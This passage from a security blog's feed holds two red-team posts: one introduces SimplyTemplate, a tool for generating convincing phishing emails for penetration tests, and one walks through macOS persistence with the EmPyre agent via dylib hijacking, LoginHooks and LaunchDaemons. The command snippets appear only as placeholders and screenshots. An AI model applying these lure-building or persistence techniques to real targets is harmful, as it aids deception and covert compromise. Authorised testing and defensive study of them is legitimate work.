&lt;p&gt;**Phishing Template Generation is an art: **&lt;/p&gt;

&lt;p&gt;Email template generation often takes a lot of time and effort to get right. This is largely due to ROE restrictions and stipulations put in place by different clients. Some clients say send the best you have, others want to pre-approve the template and even the payload in certain cases. Depending on the client they may even want to pick from a subset of templates. To make sure they have options, testers will generally develop multiple templates with varying degrees of sophistication. This can be a major, but necessary, pain for a tester.&lt;/p&gt;

&lt;p&gt;Current methodology for template generation is pretty standard and is highly variable per target organization type (government vs. civilian, service vs product based etc.). This complicates template generation for the following reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Templates must have relevance to the client&lt;/li&gt;
&lt;li&gt;Templates must entice the target to act promptly&lt;/li&gt;
&lt;li&gt;Template payload must be supported by template subject/body&lt;/li&gt;
&lt;li&gt;Templates must be formatted correctly&lt;/li&gt;
&lt;li&gt;Templates should have unique text values build the legitimacy of the message body&lt;/li&gt;
&lt;li&gt;Multiple templates should be generated for failed phishing attempts&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While this is quite an extensive list, this is merely the bare minimum to be successful at the initial stage of generating the template, let alone template theme or OSINT that is put into making the proper decisions to support the theme. Here is what my current model looks like from an operational prospective:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Conduct quick OSINT overview of the company&lt;/li&gt;
&lt;li&gt;Pick a template theme based on current news or info retrieved from OSINT&lt;/li&gt;
&lt;li&gt;Conduct research on the correct person/position to emulate in email if necessary&lt;/li&gt;
&lt;li&gt;Create a message body that supports either a link or attachment based payload&lt;/li&gt;
&lt;li&gt;Develop HTML by hand for the message body

&lt;ol&gt;
&lt;li&gt;If necessary, use outlook to build out .EML for rich HTML messages&lt;/li&gt;
&lt;li&gt;If using an old template, replace/insert necessary data inside of HTML which contains CSS&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;Use Cobalt Strike’s spear phish option to view the email&lt;/li&gt;
&lt;li&gt;Send test phish and make corrections&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This whole process is extremely time consuming to get correct and changes are often necessary to get the template 100%. If one thing is off it can affect the outcome of statistics as well as payload execution, and in many cases you only get one chance at this. I’ve found that when done correctly it was a solid 4-5 hours from start to finish. This is mainly due to reusing advanced templates and making necessary adjustments as needed. I set out to automate this process as much as possible with SimplyTemplate.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SimplyTemplate&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;Getting started with SimplyTemplate is extremely easy and can be a great supplement for the above methodology to cut down on template generation time, reduce errors, and generate rich HTML sophisticated emails with ease. This tool aims to automate 80% of the template generation process, with the 20% you perform on your own hopefully resulting in a pull request!  To get started perform the following:
```&lt;br /&gt;
  1. git clone &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate.git&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate.git&lt;/a&gt;
  2. ./Setup.sh (Kali 2 or Debian currently supported)
  3. install the required plugin when prompted into Ice Weasel&lt;br /&gt;
  4. ./SimplyTemplate.py –l&lt;/p&gt;

&lt;p&gt;To start, it helps to have an understanding of the module types so we can make accurate choices on template selection. All templates will provide you with a small meta tag. This tag will help you quickly identify the capabilities of the module, also what the &amp;ldquo;content&amp;rdquo; supports.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;High - Requires proper OSINT / Social Engineering to build and effectively deploy the template. These are generally internal based templates with specific themes.&lt;/li&gt;
&lt;li&gt;Medium - Requires a decent amount of modifications or settings, and are more general of a template external based template.&lt;/li&gt;
&lt;li&gt;Low - Requires little to no modifications of the template and are generally not effective.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each template will support one or all of the following core options:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Text - Text based option or output.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Html - Rich Html Supported for output (generally multipart Email Html/Text).&lt;/li&gt;
&lt;li&gt;Link - Template supports a major link for stats or potential web download of document/Drive-by.&lt;/li&gt;
&lt;li&gt;Attachment - Can support text that tells users to open or use the supplied attachment.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Seeing how these templates are actually rendered is extremely important. This was an issue I’ve had with the current process for templates with anything other than basic HTML tags. Some phishing platforms have issues with rendering certain formats of email templates. I highly advise using a service like Litmus (&lt;a href=&#34;https://litmus.com&#34;&gt;https://litmus.com)&lt;/a&gt;) or  Mail-Tester (&lt;a href=&#34;https://www.mail-tester.com&#34;&gt;https://www.mail-tester.com)&lt;/a&gt;) to see how the email renders on multiple applications.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;HTML - This was used by some to view the HTML markup but CSS does not render correctly in some cases. (basic templates)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;eml - Files can be outputted via .EML to open them directly in Icedove or Outlook&lt;/li&gt;
&lt;li&gt;mht - MHTML is the Mail Html Markup used and can directly rendered in Word/IE or Iceweasel via plugin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s get started with building our first template and rendering these templates.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic7.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic7.png&#34; alt=&#34;pic7&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Currently the templates are broken up by the phishing category they support based on the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;External – Templates that would most likely come from external sources

&lt;ul&gt;
&lt;li&gt;News&lt;/li&gt;
&lt;li&gt;Agency&lt;/li&gt;
&lt;li&gt;Storage&lt;/li&gt;
&lt;li&gt;Social&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Internal – Templates that would come from internal departments or employees

&lt;ul&gt;
&lt;li&gt;Marketing&lt;/li&gt;
&lt;li&gt;IT&lt;/li&gt;
&lt;li&gt;HR&lt;/li&gt;
&lt;li&gt;Agency&lt;/li&gt;
&lt;li&gt;Facilities&lt;/li&gt;
&lt;li&gt;Leadership&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As you can see this is easily displayed with the (&lt;em&gt;list)&lt;/em&gt; command within.  We can also use the (&lt;em&gt;search&lt;/em&gt;) command to search for modules by sophistication or core options of the templates.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic8.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic8.png&#34; alt=&#34;pic8&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Execute the (&lt;em&gt;use&lt;/em&gt;) command with the corresponding number and you will be dropped into the relevant template menu. If more information is required, the &lt;em&gt;(info)&lt;/em&gt; command can be used to template variables and a more in-depth explanation.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic9.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic9.png&#34; alt=&#34;pic9&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once in the template menu you have a few core commands. The first is the &lt;em&gt;(set)&lt;/em&gt; command, which allows you to set specific variables within the template. There are a set of default values that can be used, or you can provide your own. Each template will require a mix of different required values that must be set. You will also observe that higher the sophistication needed, the more OSINT is required and in turn the more settings that will need to be populated. Once all options are set, SimplyTemplate can generate the template on the fly and display the final outcome within a browser. This allows the tester to quickly make changes to settings to ensure the final result will look good on the targets end. Running the &lt;em&gt;(info)&lt;/em&gt; command will show the following changes:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic10.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic10.png&#34; alt=&#34;pic10&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As mentioned before the (&lt;em&gt;render&lt;/em&gt;) command can be extremely informative to the tester:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic11.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic11.png&#34; alt=&#34;pic11&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Even the more advanced templates render nicely in the. mht format:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic12.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic12.png&#34; alt=&#34;pic12&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Depending on the template and the corresponding sophistication level the (&lt;em&gt;edit)&lt;/em&gt; function may be available. This will eventually be used in a majority of the modules to give testers greater freedom in generating templates. When using this function, you can edit the raw paragraphs of the template before rending or template generation takes place. This is a more advanced feature but allows you to quickly add small changes with out digging through hundred lines of template code to make a spelling or grammar change. This will spawn a custom Text Editor which you can make and save the changes.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic13.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic13.png&#34; alt=&#34;pic13&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Finally use the (&lt;em&gt;gen&lt;/em&gt;) command to quickly export the final product!&lt;/p&gt;

&lt;p&gt;As always I’m looking for improvements or suggestions on both SimplyEmail or SimplyTemplate, every bit helps produce a more useful platform!&lt;/p&gt;

&lt;p&gt;Here are the links:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The Return of the EmPyre</title>
      <link>https://cybersyndicates.com/2016/05/return-empyre-series-3/</link>
      <pubDate>Tue, 24 May 2016 14:34:01 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2016/05/return-empyre-series-3/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34; alt=&#34;empyre_logo_white_background&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This post is number 3 of the EmPyre series and cross post with a fellow friend and ATD co-worker &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt;. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/424f424f&#34;&gt;@rvrsh3ll&lt;/a&gt;  &amp;ndash; &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/CptJesus&#34;&gt;@CptJesus&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5/12/16 – &lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;&lt;strong&gt;Building an EmPyre with Python&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5/18/16 – &lt;a href=&#34;http://www.rvrsh3ll.net/blog/empyre/operating-with-empyre/&#34;&gt;&lt;strong&gt;Operating with EmPyre&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;  &lt;/p&gt;

&lt;h2 id=&#34;empyre-persistence&#34;&gt;EmPyre Persistence&lt;/h2&gt;

&lt;p&gt;Mac OS X offers several methods to abuse system functionality and obtain persistence through reboots. One of the most effective methods is &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;Dylib Hijacking&lt;/a&gt;. Dylibs are comparable to DLLs in that they contain code executed by applications at runtime. Dylib Hijacking exists because of how “dyld”, the system dynamic linker, searches and loads these libraries. Let’s briefly examine the Mach-O header to understand why this vulnerability exists.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture1.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture1.png&#34; alt=&#34;Picture1&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture2.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture2.png&#34; alt=&#34;Picture2&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Figure 1 depicts the load commands for Xcode. Load commands provide the OS loader with instructions on where to find the application&amp;rsquo;s entry point, offsets for the text and data sections, and all of the libraries needed by the application at runtime. The “Name” field in the LC_LOAD_DYLIB load command identifies the file path to the DVTFoundation library. Notice that the path is prepended with @rpath. This signals to the OS loader to examine the LC_RPATH (Figure 2) load commands in order to expand the @rpath variable. Each path is searched in succession by dyld to locate the required library. Once the library is found it is loaded into the application at runtime. The issue is that any library planted in an LC_RPATH that is found before the legitimate dylib, will be loaded first. A slight variation to this attack, which we won’t cover in this post, involves the LC_LOAD_WEAK_DYLIB load command. This indicates that the specified dylib is not required but will be loaded if found. If the specified library is not present on the system, we can plant the dylib in the specified path and it will be loaded by the application at runtime. For more information on Dylib Hijacks for weak dylibs, please read the &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;white paper&lt;/a&gt; on Dylib Hijacks by @patrickwardle. The load commands slightly differ but still offer the same way to conduct this attack. We can abuse dyld’s load order to obtain consistent code execution and/or persistence in OS X.&lt;/p&gt;

&lt;p&gt;Before we can weaponize Dylib Hijacks, there is a small problem to address. When an application normally loads a library, the os loader will try to resolve symbols for functions required by the application. If those functions are not found, the application will crash. To remedy this, the hijacking dylib will need to have a LC_REEXPORT_DYLIB load command that provides the path to the legitimate dylib. When the application starts, it will load the attacking dylib first and then load the legitimate dylib.&lt;/p&gt;

&lt;p&gt;To carry out this attack in EmPyre, you will need to first run the HijackScanner module in situational_awareness/host/osx/. This is simply an adaption to @patrickwardle’s &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/scan.py&#34;&gt;python script&lt;/a&gt; to scan the system for Mach-O binaries, load each and examine the load commands to determine if the application is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture3.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture3.png&#34; alt=&#34;Picture3&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With the default options for the module, every Mach-O binary on the file system will be examined, which can take quite some time. To speed up the scan, set a path or only scan loaded process executables. Once the scan is finished, your output will provide you with the path to the vulnerable binary and the full path to where an EmPyre dylib should be planted. You will also need to locate the legitimate dylib for the next module in this attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 4&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture4.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture4.png&#34; alt=&#34;Picture4&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we see that the Xcode application is vulnerable to a dylib hijack with the DVTFoundation library. Instructions are provided after the scan output to gather the information necessary for the next module.&lt;/p&gt;

&lt;p&gt;The CreateHijacker module in persistence/osx/ configures an EmPyre dylib to be used in a Dylib Hijack. This is yet another slightly &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/createHijacker.py&#34;&gt;modified script&lt;/a&gt; written by @patrickwardle. This module does all the heavy lifting for configuring the EmPyre dylib and patching in the path to the legitimate dylib.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture5.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture5.png&#34; alt=&#34;Picture5&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Listener, UserAgent, and Arch options are all used to generate the hijacker dylib. Be sure that the architecture of the dylib matches the architecture of the vulnerable application. The “LegitimateDylibPath” option will define the full path to the legitimate dylib loaded into the application. The “vulnerableRPATH” refers to the rpath value returned from the HijackScanner module. Once we have all of our options set, we can execute the module.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 6&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture6.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture6.png&#34; alt=&#34;Picture6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Figure 6, we see that once the module is completed, an EmPyre dylib is configured and copied to the vulnerable rpath we specified. When we start the Xcode application, we receive a new EmPyre agent running in that application’s process!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 7&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture7.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture7.png&#34; alt=&#34;Picture7&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 8&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture8.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture8.png&#34; alt=&#34;Picture8&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Important Note: In some cases, killing the agent will close the application. Closing the application will always kill the agent.&lt;/p&gt;

&lt;h2 id=&#34;loginhooks&#34;&gt;LoginHooks&lt;/h2&gt;

&lt;p&gt;Just like the many supported startup locations and run keys within Windows, OS X offers a few which are deprecated but still functional (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). On the newest version of OS X, El Capitan,  “LoginHooks” seem to be an extremely reliable method of persistence and can be removed with ease. Here are a few things to note about “LoginHooks” and how they can be used:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;     Permissions for your script file should include execute privileges for the appropriate users.&lt;/li&gt;
&lt;li&gt;     The payload will execute for any user that logs in.&lt;/li&gt;
&lt;li&gt;     Only one copyof each script can be installed at a time and root privileges are needed!&lt;/li&gt;
&lt;li&gt;     If a user variable is required for login logic the $1 is passed your script.&lt;/li&gt;
&lt;li&gt;     Other login actions wait until your hook finishes executing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A benefit to using LoginHooks is the ease of installation, and target system info enumeration using the “defaults” tool. This tool also allows you to write settings to multiple sub system settings. Here is manual process to  setup a Hook:&lt;/p&gt;

&lt;p&gt;[snippet id=&amp;ldquo;37&amp;rdquo;]&lt;/p&gt;

&lt;p&gt;To remove this hook all you would need to do is use the defaults tool to delete it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;35&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly to read the hook settings you setup:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;36&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is a small demo I setup to show the install process of the LoginHook. First start out by setting up EmPyre, creating a listener, and getting your launcher executed in your test VM. Once the C2 is set up we will need to build out AppleScript that will be used for the persistence execution.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 9&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture9.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture9.png&#34; alt=&#34;Picture9&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This will output AppleScript with a simple stager to the current working directory. Next, we will have to upload the script to a directory of the operator’s choice. In this case, I just used the /tmp/ directory store my “evilscript”. To set up the hook is very simple, set the user password, this is for the sudo that takes place to install the hook and creating proper permissions on the script. This can be seen being set up in Figure 9.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 10&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture10.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture10.png&#34; alt=&#34;Picture10&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Running the defaults read command we covered earlier will result in the output of the LoginHook location, this is to ensure our hook is in place:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 11&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture11.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture11.png&#34; alt=&#34;Picture11&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At this point, the LoginHook is properly setup and installed. Anytime the user logs in, the agent will be executed. It should be noted that this method of persistence is widely known and signatured by anti-virus solutions that look for OS X specific persistence.  &lt;/p&gt;

&lt;h2 id=&#34;launchdaemon-s&#34;&gt;LaunchDaemon’s&lt;/h2&gt;

&lt;p&gt;As we talked about earlier, Apple does not approve of the many methods used to stay persistent or they are purely outdated according to the Apple development references (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). But when it comes to launching custom daemons, using ‘launchd’ is the preferred method according to Apple&amp;rsquo;s development documentation. One of the major concerns with LoginHooks are the blocking nature during execution. LoginHooks are executed during the start of a logon session, which is an inline execution of the script. If at anytime this hangs or does not launch correctly it will deadlock the user from logging in. Using launchdaemons allows you live outside of user context, giving it an amazing benefit of how execution takes place. Here are few benefits of using a daemon:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Supports inetd-style daemons&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;launchd runs as root ( Keeps it easy to run )&lt;/li&gt;
&lt;li&gt;Daemons launch on demand, communication requests do not fail if the daemon is not launched ( Just in case you mess up )&lt;/li&gt;
&lt;li&gt;If taxed they are simply delayed until the daemon can launch and process them. ( important as they are not blocking on login etc)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If these reasons are not enough for an operator, I don’t know what is. It’s an extremely clean and safe method of staying persistent on your target; however few downsides do exist:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Many defensive tools look here for persistence (as it’s a limited attack surface)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;KnockKnock  - &lt;a href=&#34;https://objective-see.com/products/knockknock.html&#34;&gt;https://objective-see.com/products/knockknock.html&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Uninstallation is a few extra steps.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We should first cover how the OS boot process works at high level to understand where your persistence will be living. When starting to work in the persistence realm, it&amp;rsquo;s extremely important to understand the small nuances such as system daemons and user agent daemons. Here is a chart I put together to quickly understand how daemons are executed upon boot and login.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 12&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture12.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture12.png&#34; alt=&#34;Picture12&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Currently EmPyre supports installing a “SYSTEM” level daemon running as root that is not dependent on a user being active. This can be very important in some cases and gives you an advantage compared to other methods. Now in Figure 11 we mentioned that the launchd service will locate the plist (property list) file, this is the core of the service and passes the required options that are associated with the service. When launchd starts up it will parse this file and decide when to start, pass arguments or listen on SOCKETS for IPC (Inter Process Communication) so it important that we have an idea of what we are installing. Here is the plist file used:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture13.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture13.png&#34; alt=&#34;Picture13&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A few main things should be noted, the Label key string value will be the name of the daemon, in this case the default Is “com.proxy.initialize”. Whereas the array string will be location plus the executable. Finally the key “RunAtLoad” and “KeepAlive” tells launchd to start at system init and stay running rather than a one-time process.&lt;/p&gt;

&lt;p&gt;To install the daemon you perform the following. Start by elevating your context to root.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 14&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture14.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture14.png&#34; alt=&#34;Picture14&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After you have an elevated agent we can go ahead and setup the persistence, using the “persistence/osx/launchdaemonexecutable”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 15&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture15.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture15.png&#34; alt=&#34;Picture15&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;That’s it, EmPyre does all the nitty-gritty work of creating the executable, writing it to disk, building the plist and registering it to launchd! When testing is complete we can use the “RemoveDaemon” module to properly clean up. (*Remember to take notes on the paths during install!)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Figure 16&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture16.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture16.png&#34; alt=&#34;Picture16&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Hope this can get you started and maybe give you some ideas of where persistence can also be installed!&lt;/p&gt;

&lt;p&gt;References :&lt;/p&gt;

&lt;p&gt;OS X Persistence-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&#34;&gt;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;OS X boot Process-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;LoginHooks- &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Launchd-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&lt;/a&gt;&lt;/p&gt;

